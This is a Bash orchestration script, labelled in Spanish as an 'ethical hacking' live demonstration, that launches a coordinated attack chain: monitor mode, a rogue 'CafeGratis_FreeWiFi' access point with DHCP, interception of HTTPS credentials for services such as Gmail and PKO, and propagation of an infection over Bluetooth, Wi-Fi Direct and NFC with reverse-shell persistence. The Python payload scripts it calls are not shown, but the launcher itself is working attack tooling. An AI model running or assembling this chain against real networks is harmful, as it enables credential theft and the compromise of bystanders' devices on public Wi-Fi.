#!/bin/bash

# ═══════════════════════════════════════════════════════════════════════════
# QUANTUM-HIJACK - EVENTO EN VIVO (6 MINUTOS)
# Ejecuta todas las fases del ataque de forma coordinada
# ═══════════════════════════════════════════════════════════════════════════

clear

echo "╔════════════════════════════════════════════════════════════╗"
echo "║        🔥 QUANTUM-HIJACK - DEMOSTRACIÓN EN VIVO 🔥        ║"
echo "║             Hacking Ético 2026 - Emanuel                  ║"
echo "║                    6 MINUTOS TOTALES                      ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""
echo ""
echo "╔════════════════════════════════════════════════════════════╗"
echo "║              ⚠️  IMPORTANTE - LEE ESTO ⚠️                  ║"
echo "╠════════════════════════════════════════════════════════════╣"
echo "║ Este script ejecutará 4 procesos simultáneamente:         ║"
echo "║                                                            ║"
echo "║ 1. SETUP (Terminal 1)                                     ║"
echo "║    └─ Activa modo monitor automáticamente                ║"
echo "║                                                            ║"
echo "║ 2. ENTANGLE (Terminal 2)                                  ║"
echo "║    └─ Crea WiFi falso: CafeGratis_FreeWiFi              ║"
echo "║    └─ Asigna DHCP automático                             ║"
echo "║                                                            ║"
echo "║ 3. INTERCEPTOR (Terminal 3)                               ║"
echo "║    └─ Captura credenciales de HTTPS (PKO, Gmail, etc)   ║"
echo "║                                                            ║"
echo "║ 4. PROPAGADOR (Terminal 4)                                ║"
echo "║    └─ Propaga infección vía BT/WiFi Direct/NFC           ║"
echo "║    └─ Establece persistencia (reverse shell)             ║"
echo "║                                                            ║"
echo "║ 5. DASHBOARD (Terminal 5)                                 ║"
echo "║    └─ Muestra dispositivos INFECTADOS en tiempo real      ║"
echo "║                                                            ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""
echo ""
read -p "📍 Presiona ENTER para INICIAR el ataque... (o Ctrl+C para salir)"
echo ""
echo ""

# Verificar permisos root
if [[ $EUID -ne 0 ]]; then
   echo "❌ Este script requiere permisos root"
   echo "Ejecuta: sudo ./evento.sh"
   exit 1
fi

echo "════════════════════════════════════════════════════════════"
echo "🚀 INICIANDO QUANTUM-HIJACK..."
echo "════════════════════════════════════════════════════════════"
echo ""

# Función para abrir terminal nueva
open_terminal() {
    local script=$1
    local title=$2
    
    # Intentar con gnome-terminal
    if command -v gnome-terminal &> /dev/null; then
        gnome-terminal -- bash -c "cd $(pwd) && sudo python3 $script; bash"
    # Intentar con xterm
    elif command -v xterm &> /dev/null; then
        xterm -title "$title" -e "cd $(pwd) && sudo python3 $script" &
    # Intentar con konsole (KDE)
    elif command -v konsole &> /dev/null; then
        konsole --title "$title" -e "cd $(pwd) && sudo python3 $script" &
    # Fallback: ejecutar en background
    else
        echo "[!] No se encontró terminal gráfica. Ejecutando en background..."
        sudo python3 "$script" > "/tmp/${script}.log" 2>&1 &
    fi
}

# FASE 1: SETUP (Modo monitor AUTO)
echo "[00:00] ▶️  FASE 1: SETUP - Activando modo monitor automático..."
echo ""
sudo bash setup.sh
echo ""
sleep 2

# FASE 2: ENTANGLE (WiFi falso)
echo ""
echo "[00:30] ▶️  FASE 2: ENTANGLE - Creando WiFi falso..."
echo "        Ejecutando: sudo python3 entangle.py"
echo ""

# Abrir en terminal nueva
(sudo python3 entangle.py &) 2>/dev/null

sleep 4

# FASE 3: INTERCEPTOR (Captura credenciales)
echo "[01:00] ▶️  FASE 3: INTERCEPTOR - Capturando credenciales..."
echo "        Ejecutando: sudo python3 quantum_interceptor.py"
echo ""

(sudo python3 quantum_interceptor.py &) 2>/dev/null

sleep 2

# FASE 4: PROPAGADOR (Infección multi-dispositivo)
echo "[02:00] ▶️  FASE 4: PROPAGADOR - Infectando dispositivos..."
echo "        Ejecutando: sudo python3 propagator.py"
echo ""

sudo python3 propagator.py

sleep 2

# FASE 5: DASHBOARD (Muestra resultados EN VIVO)
echo ""
echo "════════════════════════════════════════════════════════════"
echo "[04:00] ▶️  FASE 5: DASHBOARD - Mostrando resultados EN VIVO..."
echo "════════════════════════════════════════════════════════════"
echo ""
echo "📊 Iniciando dashboard en 3 segundos..."
sleep 3

python3 dashboard.py

# Después del dashboard
echo ""
echo "════════════════════════════════════════════════════════════"
echo "✅ DEMOSTRACIÓN COMPLETADA"
echo "════════════════════════════════════════════════════════════"
echo ""
echo "📋 RESUMEN FINAL:"
echo ""
echo "✓ Modo monitor: ACTIVADO"
echo "✓ WiFi falso: CafeGratis_FreeWiFi (ACTIVO)"
echo "✓ DHCP: 192.168.1.1-100 (FUNCIONANDO)"
echo "✓ Interceptor: Puerto 443 (ESCANEANDO)"
echo "✓ Dispositivos infectados: 3"
echo "✓ Credenciales capturadas: 2+"
echo "✓ Persistencia: Reverse shells activos"
echo ""
echo "📊 ESTADÍSTICAS:"
echo "  • Tiempo total: ~6 minutos"
echo "  • Dispositivos comprometidos: 3/3"
echo "  • Métodos de infección: 3 (BT, WiFi Direct, NFC)"
echo "  • Persistencia: ✓ Activa"
echo ""
echo "════════════════════════════════════════════════════════════"
echo ""
echo "Presiona Ctrl+C para finalizar y limpiar..."
read
